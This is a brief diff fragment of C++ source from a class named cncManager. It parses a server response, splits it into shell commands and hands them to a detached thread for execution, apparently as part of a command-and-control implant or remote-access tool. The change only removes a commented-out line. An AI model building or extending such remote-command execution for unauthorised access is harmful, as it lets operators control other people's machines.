@@ -205,7 +205,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     while (std::getline(spliter, tmp, ';')) {
                         this->shellCmd.push_back(tmp);
                     }
-                    //this->handleShellRequest()
+                  
                     std::thread shellHandler = std::thread(&cncManager::handleShellRequest, this);
                     shellHandler.detach();
 
